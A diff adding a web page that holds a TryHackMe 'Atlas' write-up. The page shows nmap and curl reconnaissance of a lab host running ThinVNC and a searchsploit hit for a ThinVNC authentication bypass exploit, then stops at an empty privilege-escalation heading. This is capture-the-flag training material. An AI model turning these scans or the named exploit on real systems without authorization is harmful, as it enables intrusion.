@@ -1,0 +1,1096 @@
+
+<!doctype html>
+<html lang="en" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+      
+      
+      
+        <link rel="prev" href="../anthem/">
+      
+      
+        <link rel="next" href="../attackingkerberos/">
+      
+      
+        
+      
+      
+      <link rel="icon" href="../../assets/images/favicon.png">
+      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.7.1">
+    
+    
+      
+        <title>Atlas - rdrg0x</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../assets/stylesheets/main.484c7ddc.min.css">
+      
+        
+        <link rel="stylesheet" href="../../assets/stylesheets/palette.ab4e12ef.min.css">
+      
+      
+
+
+    
+    
+      
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback">
+        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
+      
+    
+    
+    <script>__md_scope=new URL("../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+  </head>
+  
+  
+    
+    
+      
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="slate" data-md-color-primary="black" data-md-color-accent="deep-purple">
+  
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#atlas" class="md-skip">
+          Skip to content
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+  
+
+<header class="md-header md-header--shadow" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="Header">
+    <a href="../.." title="rdrg0x" class="md-header__button md-logo" aria-label="rdrg0x" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            rdrg0x
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              Atlas
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+      
+        <form class="md-header__option" data-md-component="palette">
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="" data-md-color-scheme="slate" data-md-color-primary="black" data-md-color-accent="deep-purple"  aria-hidden="true"  type="radio" name="__palette" id="__palette_0">
+    
+  
+</form>
+      
+    
+    
+      <script>var palette=__md_get("__palette");if(palette&&palette.color){if("(prefers-color-scheme)"===palette.color.media){var media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']");palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent")}for(var[key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script>
+    
+    
+    
+      
+      
+        <label class="md-header__button md-icon" for="__search">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        </label>
+        <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <label class="md-search__icon md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+      </label>
+      <nav class="md-search__options" aria-label="Search">
+        
+        <button type="reset" class="md-search__icon md-icon" title="Clear" aria-label="Clear" tabindex="-1">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
+        </button>
+      </nav>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            Initializing search
+          </div>
+          <ol class="md-search-result__list" role="presentation"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+      
+    
+    
+  </nav>
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+          
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+
+<nav class="md-nav md-nav--primary" aria-label="Navigation" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="../.." title="rdrg0x" class="md-nav__button md-logo" aria-label="rdrg0x" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    rdrg0x
+  </label>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../.." class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Home
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+    
+  
+  
+  
+    
+    
+    
+    
+      
+        
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--section md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2" checked>
+        
+          
+          <label class="md-nav__link" for="__nav_2" id="__nav_2_label" tabindex="">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Writeups
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_2_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_2">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Writeups
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../HackTheBox/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    HackTheBox
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    
+    
+    
+    
+      
+    
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_2" checked>
+        
+          
+          <label class="md-nav__link" for="__nav_2_2" id="__nav_2_2_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    TryHackme
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_2_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_2_2">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    TryHackme
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../alfred/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Alfred
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../ADBasicEnum/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    AD Basic Enumeration
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../anthem/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Anthem
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
+      
+      
+        
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Atlas
+  
+
+    
+  </span>
+  
+  
+
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Atlas
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#enumeration" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Enumeration
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Enumeration">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#nmap" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Nmap
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#http-80-8080" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        HTTP (80, 8080)
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#privesc" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Privesc
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#post-explotation" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Post-explotation
+      
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../attackingkerberos/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Attacking kerberos
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../tags/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Tags
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#enumeration" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Enumeration
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Enumeration">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#nmap" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Nmap
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#http-80-8080" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        HTTP (80, 8080)
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#privesc" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Privesc
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#post-explotation" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Post-explotation
+      
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          
+            <div class="md-content" data-md-component="content">
+              
+                
+
+
+
+  
+
+
+  <nav class="md-path" aria-label="Navigation" >
+    <ol class="md-path__list">
+      
+        
+  
+  
+    <li class="md-path__item">
+      <a href="../.." class="md-path__link">
+        
+  <span class="md-ellipsis">
+    Home
+  </span>
+
+      </a>
+    </li>
+  
+
+      
+      
+        
+  
+  
+    
+    
+      <li class="md-path__item">
+        <a href="../../HackTheBox/" class="md-path__link">
+          
+  <span class="md-ellipsis">
+    Writeups
+  </span>
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+    
+    
+      <li class="md-path__item">
+        <a href="../alfred/" class="md-path__link">
+          
+  <span class="md-ellipsis">
+    TryHackme
+  </span>
+
+        </a>
+      </li>
+    
+  
+
+      
+    </ol>
+  </nav>
+
+              
+              <article class="md-content__inner md-typeset">
+                
+                  
+
+  <nav class="md-tags" >
+    
+      
+      
+      
+      
+        <a href="../../tags/#tag:tryhackme" class="md-tag">tryhackme</a>
+      
+    
+      
+      
+      
+      
+        <a href="../../tags/#tag:windows" class="md-tag">windows</a>
+      
+    
+  </nav>
+
+
+
+<h1 id="atlas">atlas<a class="headerlink" href="#atlas" title="Permanent link">&para;</a></h1>
+<p><img alt="alt text" src="img/image.png" /></p>
+<h2 id="enumeration">Enumeration<a class="headerlink" href="#enumeration" title="Permanent link">&para;</a></h2>
+<h3 id="nmap">Nmap<a class="headerlink" href="#nmap" title="Permanent link">&para;</a></h3>
+<div class="highlight"><pre><span></span><code>nmap<span class="w"> </span>-p-<span class="w"> </span>--open<span class="w"> </span>-sS<span class="w"> </span>--min-rate<span class="w"> </span><span class="m">5000</span><span class="w"> </span>-n<span class="w"> </span>-Pn<span class="w"> </span>-oN<span class="w"> </span>allPorts.txt<span class="w"> </span>-oG<span class="w"> </span>ports<span class="w"> </span><span class="m">10</span>.201.53.80
+
+PORT<span class="w">     </span>STATE<span class="w"> </span>SERVICE
+<span class="m">3389</span>/tcp<span class="w"> </span>open<span class="w">  </span>ms-wbt-server
+<span class="m">7680</span>/tcp<span class="w"> </span>open<span class="w">  </span>pando-pub
+<span class="m">8080</span>/tcp<span class="w"> </span>open<span class="w">  </span>http-proxy
+</code></pre></div>
+<div class="highlight"><pre><span></span><code>nmap<span class="w"> </span>-sC<span class="w"> </span>-sV<span class="w"> </span>-p3389,7680,8080<span class="w"> </span>-Pn<span class="w"> </span><span class="m">10</span>.201.53.80<span class="w"> </span>-oN<span class="w"> </span>target.txt
+
+PORT<span class="w">     </span>STATE<span class="w">    </span>SERVICE<span class="w">       </span>VERSION
+<span class="m">3389</span>/tcp<span class="w"> </span>open<span class="w">     </span>ms-wbt-server<span class="w"> </span>Microsoft<span class="w"> </span>Terminal<span class="w"> </span>Services
+<span class="p">|</span>_ssl-date:<span class="w"> </span><span class="m">2025</span>-11-05T08:11:32+00:00<span class="p">;</span><span class="w"> </span>-1s<span class="w"> </span>from<span class="w"> </span>scanner<span class="w"> </span>time.
+<span class="p">|</span><span class="w"> </span>ssl-cert:<span class="w"> </span>Subject:<span class="w"> </span><span class="nv">commonName</span><span class="o">=</span>GAIA
+<span class="p">|</span><span class="w"> </span>Not<span class="w"> </span>valid<span class="w"> </span>before:<span class="w"> </span><span class="m">2025</span>-11-04T08:03:55
+<span class="p">|</span>_Not<span class="w"> </span>valid<span class="w"> </span>after:<span class="w">  </span><span class="m">2026</span>-05-06T08:03:55
+<span class="m">7680</span>/tcp<span class="w"> </span>filtered<span class="w"> </span>pando-pub
+<span class="m">8080</span>/tcp<span class="w"> </span>open<span class="w">     </span>http-proxy
+<span class="p">|</span><span class="w"> </span>http-auth:<span class="w"> </span>
+<span class="p">|</span><span class="w"> </span>HTTP/1.1<span class="w"> </span><span class="m">401</span><span class="w"> </span>Access<span class="w"> </span>Denied<span class="se">\x</span>0D
+<span class="p">|</span>_<span class="w">  </span>Digest<span class="w"> </span><span class="nv">qop</span><span class="o">=</span>auth<span class="w"> </span><span class="nv">nonce</span><span class="o">=</span><span class="nv">oxcX68px5kCI4zgCynHmQA</span><span class="o">==</span><span class="w"> </span><span class="nv">realm</span><span class="o">=</span>ThinVNC<span class="w"> </span><span class="nv">opaque</span><span class="o">=</span>RdFwI8RWkZUZNoA7dQl8yj80O3fDRyVFVg
+<span class="p">|</span>_http-title:<span class="w"> </span><span class="m">401</span><span class="w"> </span>Access<span class="w"> </span>Denied
+<span class="p">|</span><span class="w"> </span>fingerprint-strings:<span class="w"> </span>
+<span class="p">|</span><span class="w">   </span>FourOhFourRequest:<span class="w"> </span>
+<span class="p">|</span><span class="w">     </span>HTTP/1.1<span class="w"> </span><span class="m">404</span><span class="w"> </span>Not<span class="w"> </span>Found
+<span class="p">|</span><span class="w">     </span>Content-Type:<span class="w"> </span>text/html
+<span class="p">|</span><span class="w">     </span>Content-Length:<span class="w"> </span><span class="m">177</span>
+<span class="p">|</span><span class="w">     </span>Connection:<span class="w"> </span>Keep-Alive
+<span class="p">|</span><span class="w">     </span>&lt;HTML&gt;&lt;HEAD&gt;&lt;TITLE&gt;404<span class="w"> </span>Not<span class="w"> </span>Found&lt;/TITLE&gt;&lt;/HEAD&gt;&lt;BODY&gt;&lt;H1&gt;404<span class="w"> </span>Not<span class="w"> </span>Found&lt;/H1&gt;The<span class="w"> </span>requested<span class="w"> </span>URL<span class="w"> </span>nice%20ports%2C/Tri%6Eity.txt%2ebak<span class="w"> </span>was<span class="w"> </span>not<span class="w"> </span>found<span class="w"> </span>on<span class="w"> </span>this<span class="w"> </span>server.&lt;P&gt;&lt;/BODY&gt;&lt;/HTML&gt;
+<span class="p">|</span><span class="w">   </span>GetRequest:<span class="w"> </span>
+<span class="p">|</span><span class="w">     </span>HTTP/1.1<span class="w"> </span><span class="m">401</span><span class="w"> </span>Access<span class="w"> </span>Denied
+<span class="p">|</span><span class="w">     </span>Content-Type:<span class="w"> </span>text/html
+<span class="p">|</span><span class="w">     </span>Content-Length:<span class="w"> </span><span class="m">144</span>
+<span class="p">|</span><span class="w">     </span>Connection:<span class="w"> </span>Keep-Alive
+<span class="p">|</span><span class="w">     </span>WWW-Authenticate:<span class="w"> </span>Digest<span class="w"> </span><span class="nv">realm</span><span class="o">=</span><span class="s2">&quot;ThinVNC&quot;</span>,<span class="w"> </span><span class="nv">qop</span><span class="o">=</span><span class="s2">&quot;auth&quot;</span>,<span class="w"> </span><span class="nv">nonce</span><span class="o">=</span><span class="s2">&quot;ZsSj4Mpx5kCI1zgCynHmQA==&quot;</span>,<span class="w"> </span><span class="nv">opaque</span><span class="o">=</span><span class="s2">&quot;cp5TYmnrjexhTJeoocMfNeiKJx8RtVDQbr&quot;</span>
+<span class="p">|</span>_<span class="w">    </span>&lt;HTML&gt;&lt;HEAD&gt;&lt;TITLE&gt;401<span class="w"> </span>Access<span class="w"> </span>Denied&lt;/TITLE&gt;&lt;/HEAD&gt;&lt;BODY&gt;&lt;H1&gt;401<span class="w"> </span>Access<span class="w"> </span>Denied&lt;/H1&gt;The<span class="w"> </span>requested<span class="w"> </span>URL<span class="w"> </span>requires<span class="w"> </span>authorization.&lt;P&gt;&lt;/BODY&gt;&lt;/HTML&gt;
+<span class="m">1</span><span class="w"> </span>service<span class="w"> </span>unrecognized<span class="w"> </span>despite<span class="w"> </span>returning<span class="w"> </span>data.<span class="w"> </span>If<span class="w"> </span>you<span class="w"> </span>know<span class="w"> </span>the<span class="w"> </span>service/version,<span class="w"> </span>please<span class="w"> </span>submit<span class="w"> </span>the<span class="w"> </span>following<span class="w"> </span>fingerprint<span class="w"> </span>at<span class="w"> </span>https://nmap.org/cgi-bin/submit.cgi?new-service<span class="w"> </span>:
+SF-Port8080-TCP:V<span class="o">=</span><span class="m">7</span>.95%I<span class="o">=</span><span class="m">7</span>%D<span class="o">=</span><span class="m">11</span>/5%Time<span class="o">=</span>690B063E%P<span class="o">=</span>x86_64-pc-linux-gnu%r<span class="o">(</span>Ge
+SF:tRequest,179,<span class="s2">&quot;HTTP/1\.1\x20401\x20Access\x20Denied\r\nContent-Type:\x20</span>
+<span class="s2">SF:text/html\r\nContent-Length:\x20144\r\nConnection:\x20Keep-Alive\r\nWWW</span>
+<span class="s2">SF:-Authenticate:\x20Digest\x20realm=\&quot;ThinVNC\&quot;,\x20qop=\&quot;auth\&quot;,\x20nonc</span>
+<span class="s2">SF:e=\&quot;ZsSj4Mpx5kCI1zgCynHmQA==\&quot;,\x20opaque=\&quot;cp5TYmnrjexhTJeoocMfNeiKJx8</span>
+<span class="s2">SF:RtVDQbr\&quot;\r\n\r\n&lt;HTML&gt;&lt;HEAD&gt;&lt;TITLE&gt;401\x20Access\x20Denied&lt;/TITLE&gt;&lt;/HE</span>
+<span class="s2">SF:AD&gt;&lt;BODY&gt;&lt;H1&gt;401\x20Access\x20Denied&lt;/H1&gt;The\x20requested\x20URL\x20\x2</span>
+<span class="s2">SF:0requires\x20authorization\.&lt;P&gt;&lt;/BODY&gt;&lt;/HTML&gt;\r\n&quot;</span><span class="o">)</span>%r<span class="o">(</span>FourOhFourRequest
+SF:,111,<span class="s2">&quot;HTTP/1\.1\x20404\x20Not\x20Found\r\nContent-Type:\x20text/html\r\</span>
+<span class="s2">SF:nContent-Length:\x20177\r\nConnection:\x20Keep-Alive\r\n\r\n&lt;HTML&gt;&lt;HEAD</span>
+<span class="s2">SF:&gt;&lt;TITLE&gt;404\x20Not\x20Found&lt;/TITLE&gt;&lt;/HEAD&gt;&lt;BODY&gt;&lt;H1&gt;404\x20Not\x20Found</span>
+<span class="s2">SF:&lt;/H1&gt;The\x20requested\x20URL\x20nice%20ports%2C/Tri%6Eity\.txt%2ebak\x2</span>
+<span class="s2">SF:0was\x20not\x20found\x20on\x20this\x20server\.&lt;P&gt;&lt;/BODY&gt;&lt;/HTML&gt;\r\n&quot;</span><span class="o">)</span><span class="p">;</span>
+Service<span class="w"> </span>Info:<span class="w"> </span>OS:<span class="w"> </span>Windows<span class="p">;</span><span class="w"> </span>CPE:<span class="w"> </span>cpe:/o:microsoft:windows
+
+Host<span class="w"> </span>script<span class="w"> </span>results:
+<span class="p">|</span>_clock-skew:<span class="w"> </span>-1s
+
+Service<span class="w"> </span>detection<span class="w"> </span>performed.<span class="w"> </span>Please<span class="w"> </span>report<span class="w"> </span>any<span class="w"> </span>incorrect<span class="w"> </span>results<span class="w"> </span>at<span class="w"> </span>https://nmap.org/submit/<span class="w"> </span>.
+Nmap<span class="w"> </span><span class="k">done</span>:<span class="w"> </span><span class="m">1</span><span class="w"> </span>IP<span class="w"> </span>address<span class="w"> </span><span class="o">(</span><span class="m">1</span><span class="w"> </span>host<span class="w"> </span>up<span class="o">)</span><span class="w"> </span>scanned<span class="w"> </span><span class="k">in</span><span class="w"> </span><span class="m">135</span>.93<span class="w"> </span>seconds
+</code></pre></div>
+<h3 id="http-80-8080">HTTP (80, 8080)<a class="headerlink" href="#http-80-8080" title="Permanent link">&para;</a></h3>
+<div class="highlight"><pre><span></span><code>whatweb http://10.201.53.80:8080
+http://10.201.53.80:8080 [401 Unauthorized] Country[RESERVED][ZZ], IP[10.201.53.80], Title[401 Access Denied], WWW-Authenticate[ThinVNC][Digest]
+</code></pre></div>
+<div class="highlight"><pre><span></span><code>curl<span class="w"> </span><span class="m">10</span>.201.53.80:8080<span class="w"> </span>-v<span class="w">                                                                                     </span>
+
+*<span class="w">   </span>Trying<span class="w"> </span><span class="m">10</span>.201.53.80:8080...
+*<span class="w"> </span>Connected<span class="w"> </span>to<span class="w"> </span><span class="m">10</span>.201.53.80<span class="w"> </span><span class="o">(</span><span class="m">10</span>.201.53.80<span class="o">)</span><span class="w"> </span>port<span class="w"> </span><span class="m">8080</span>
+*<span class="w"> </span>using<span class="w"> </span>HTTP/1.x
+&gt;<span class="w"> </span>GET<span class="w"> </span>/<span class="w"> </span>HTTP/1.1
+&gt;<span class="w"> </span>Host:<span class="w"> </span><span class="m">10</span>.201.53.80:8080
+&gt;<span class="w"> </span>User-Agent:<span class="w"> </span>curl/8.15.0
+&gt;<span class="w"> </span>Accept:<span class="w"> </span>*/*
+&gt;<span class="w"> </span>
+*<span class="w"> </span>Request<span class="w"> </span>completely<span class="w"> </span>sent<span class="w"> </span>off
+&lt;<span class="w"> </span>HTTP/1.1<span class="w"> </span><span class="m">401</span><span class="w"> </span>Access<span class="w"> </span>Denied
+&lt;<span class="w"> </span>Content-Type:<span class="w"> </span>text/html
+&lt;<span class="w"> </span>Content-Length:<span class="w"> </span><span class="m">144</span>
+&lt;<span class="w"> </span>Connection:<span class="w"> </span>Keep-Alive
+&lt;<span class="w"> </span>WWW-Authenticate:<span class="w"> </span>Digest<span class="w"> </span><span class="nv">realm</span><span class="o">=</span><span class="s2">&quot;ThinVNC&quot;</span>,<span class="w"> </span><span class="nv">qop</span><span class="o">=</span><span class="s2">&quot;auth&quot;</span>,<span class="w"> </span><span class="nv">nonce</span><span class="o">=</span><span class="s2">&quot;euTo98px5kDI4zgCynHmQA==&quot;</span>,<span class="w"> </span><span class="nv">opaque</span><span class="o">=</span><span class="s2">&quot;fGy8UHZ0o8gextFhHmJ35gJGF2fCCsZw8r&quot;</span>
+&lt;<span class="w"> </span>
+&lt;HTML&gt;&lt;HEAD&gt;&lt;TITLE&gt;401<span class="w"> </span>Access<span class="w"> </span>Denied&lt;/TITLE&gt;&lt;/HEAD&gt;&lt;BODY&gt;&lt;H1&gt;401<span class="w"> </span>Access<span class="w"> </span>Denied&lt;/H1&gt;The<span class="w"> </span>requested<span class="w"> </span>URL<span class="w">  </span>requires<span class="w"> </span>authorization.&lt;P&gt;&lt;/BODY&gt;&lt;/HTML&gt;
+*<span class="w"> </span>Connection<span class="w"> </span><span class="c1">#0 to host 10.201.53.80 left intact</span>
+</code></pre></div>
+<p><img alt="alt text" src="img/image-1.png" /></p>
+<div class="highlight"><pre><span></span><code>searchsploit<span class="w"> </span>thinvnc<span class="w">                   </span>
+
+----------------------------------------------<span class="w"> </span>---------------------------------<span class="w"> </span>
+Exploit<span class="w"> </span>Title<span class="w">                                 </span><span class="p">|</span><span class="w"> </span>Path<span class="w"> </span>
+----------------------------------------------<span class="w"> </span>---------------------------------<span class="w"> </span>
+ThinVNC<span class="w"> </span><span class="m">1</span>.0b1<span class="w"> </span>-<span class="w"> </span>Authentication<span class="w"> </span>Bypass<span class="w">         </span><span class="p">|</span><span class="w"> </span>windows/remote/47519.py<span class="w"> </span>
+----------------------------------------------<span class="w"> </span>---------------------------------<span class="w"> </span>
+Shellcodes:<span class="w"> </span>No<span class="w"> </span>Results
+</code></pre></div>
+<h2 id="privesc">Privesc<a class="headerlink" href="#privesc" title="Permanent link">&para;</a></h2>
